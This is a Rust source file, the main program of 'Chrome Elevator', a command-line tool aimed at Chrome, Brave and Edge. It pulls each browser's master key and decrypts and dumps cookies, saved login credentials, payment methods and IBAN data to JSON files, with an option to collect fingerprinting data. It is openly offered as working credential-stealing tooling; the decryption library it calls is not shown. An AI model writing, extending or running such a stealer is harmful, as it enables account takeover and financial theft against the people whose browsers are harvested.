// Chrome Elevator - Rust Edition
// v0.17.0 - Rust port with cross-platform compilation support

use anyhow::Result;
use chrome_elevator::decryption::{AbeDecryptor, BrowserConfig, DataExtractor, ExtractionResult};
use std::env;
use std::path::PathBuf;

fn main() -> Result<()> {
    print_banner();

    let args: Vec<String> = env::args().collect();

    if args.len() < 2 {
        print_usage();
        return Ok(());
    }

    let config = parse_args(&args)?;

    match config.browser.as_str() {
        "all" => process_all_browsers(&config)?,
        browser => process_browser(browser, &config)?,
    }

    Ok(())
}

fn print_banner() {
    println!(
        r#"
_________ .__                         ___________.__                       __
\_   ___ \|  |_________  ____   _____ \_   _____/|  |   _______  _______ _/  |_  ___________
/    \  \/|  |  \_  __ \/  _ \ /     \ |    __)_ |  | _/ __ \  \/ /\__  \\   __\/  _ \_  __ \
\     \___|   Y  \  | \(  <_> )  Y Y  \|        \|  |_\  ___/\   /  / __ \|  | (  <_> )  | \/
 \______  /___|  /__|   \____/|__|_|  /_______  /|____/\___  >\_/  (____  /__|  \____/|__|
        \/     \/                   \/        \/           \/           \/

 Rust Edition - Cross-Platform Build
 v0.17.0 by Rust Port
"#
    );
}

fn print_usage() {
    println!("Usage:");
    println!("  chrome-elevator.exe [options] <chrome|brave|edge|all>");
    println!();
    println!("Options:");
    println!("  --output-path|-o <path>  Directory for output files (default: .\\output\\)");
    println!("  --verbose|-v             Enable verbose debug output");
    println!("  --fingerprint|-f         Extract browser fingerprinting data");
    println!("  --help|-h                Show this help message");
    println!();
    println!("Browser targets:");
    println!("  chrome  - Extract from Google Chrome");
    println!("  brave   - Extract from Brave Browser");
    println!("  edge    - Extract from Microsoft Edge");
    println!("  all     - Extract from all installed browsers");
}

#[derive(Debug, Clone)]
struct Config {
    browser: String,
    output_path: PathBuf,
    verbose: bool,
    fingerprint: bool,
}

fn parse_args(args: &[String]) -> Result<Config> {
    let mut config = Config {
        browser: String::new(),
        output_path: PathBuf::from("./output"),
        verbose: false,
        fingerprint: false,
    };

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "--output-path" | "-o" => {
                i += 1;
                if i < args.len() {
                    config.output_path = PathBuf::from(&args[i]);
                }
            }
            "--verbose" | "-v" => config.verbose = true,
            "--fingerprint" | "-f" => config.fingerprint = true,
            "--help" | "-h" => {
                print_usage();
                std::process::exit(0);
            }
            arg if !arg.starts_with('-') => {
                config.browser = arg.to_string();
            }
            _ => {}
        }
        i += 1;
    }

    if config.browser.is_empty() {
        anyhow::bail!("No browser target specified");
    }

    Ok(config)
}

fn process_browser(browser: &str, config: &Config) -> Result<()> {
    println!("[*] Processing {}...", browser);

    // 获取浏览器配置
    let browser_config = BrowserConfig::from_name(browser)?;

    // 检查浏览器是否安装
    if !browser_config.is_installed() {
        println!("[!] {} is not installed or has no user data", browser);
        return Ok(());
    }

    println!(
        "[+] {} found at: {}",
        browser_config.display_name,
        browser_config.user_data_path.display()
    );

    if config.verbose {
        println!(
            "[*] Local State path: {}",
            browser_config.local_state_path().display()
        );
    }

    // 获取主密钥
    println!("[*] Extracting master key...");
    let master_key = match AbeDecryptor::get_master_key(&browser_config.local_state_path()) {
        Ok(key) => {
            println!(
                "[+] Master key extracted successfully ({} bytes)",
                key.len()
            );
            key
        }
        Err(e) => {
            eprintln!("[!] Failed to extract master key: {}", e);
            if config.verbose {
                eprintln!("[!] Error details: {:?}", e);
            }
            return Err(e);
        }
    };

    // 创建数据提取器
    let extractor = DataExtractor::new(&master_key)?;

    // 提取所有数据
    println!("[*] Extracting browser data...");
    let result = extractor.extract_all(&browser_config.user_data_path)?;

    println!("[+] Data extraction completed:");
    println!("    - Cookies: {} items", result.cookies.len());
    println!("    - Login credentials: {} items", result.login_data.len());
    println!("    - Payment methods: {} items", result.payment_data.len());
    println!("    - IBAN data: {} items", result.iban_data.len());

    // 保存结果
    save_results(&result, browser, config)?;

    Ok(())
}

fn process_all_browsers(config: &Config) -> Result<()> {
    // 发现所有已安装的浏览器
    let browsers = chrome_elevator::decryption::discover_installed_browsers();

    if browsers.is_empty() {
        println!("[!] No Chromium browsers found");
        return Ok(());
    }

    println!("[*] Found {} browser(s)", browsers.len());

    for browser_config in browsers {
        println!();
        if let Err(e) = process_browser(&browser_config.name, config) {
            eprintln!(
                "[!] Failed to process {}: {}",
                browser_config.display_name, e
            );
            if config.verbose {
                eprintln!("[!] Error details: {:?}", e);
            }
        }
    }

    Ok(())
}

fn save_results(result: &ExtractionResult, browser: &str, config: &Config) -> Result<()> {
    // 创建输出目录
    std::fs::create_dir_all(&config.output_path)?;

    // 生成输出文件路径
    let timestamp = chrono::Utc::now().format("%Y%m%d_%H%M%S");
    let filename = format!("{}_{}.json", browser, timestamp);
    let output_file = config.output_path.join(&filename);

    // 序列化结果为 JSON
    let json = result.to_json()?;

    // 写入文件
    std::fs::write(&output_file, json)?;

    println!("[+] Results saved to: {}", output_file.display());

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    #[test]
    fn test_args_parsing() {
        // 测试命令行参数解析
        let args = vec![
            "chrome-elevator".to_string(),
            "chrome".to_string(),
            "--output-path".to_string(),
            "./output".to_string(),
        ];

        let config = parse_args(&args).ok();
        assert!(config.is_some());
    }

    #[test]
    fn test_browser_detection() {
        // 测试浏览器检测逻辑
        let chrome_name = "chrome";
        let brave_name = "brave";
        let edge_name = "edge";
        let all_name = "all";

        assert_eq!(chrome_name, "chrome");
        assert_eq!(brave_name, "brave");
        assert_eq!(edge_name, "edge");
        assert_eq!(all_name, "all");
    }

    #[test]
    fn test_output_path_handling() {
        // 测试输出路径处理
        let paths = vec!["./output", "C:\\output", "/tmp/output"];

        for path in paths {
            let p = Path::new(path);
            assert!(!p.as_os_str().is_empty());
        }
    }

    #[test]
    fn test_browser_config_struct() {
        // 测试浏览器配置结构
        let browsers = vec!["chrome", "brave", "edge"];

        for browser in browsers {
            assert!(!browser.is_empty());
            assert!(browser.len() <= 10);
        }
    }
}
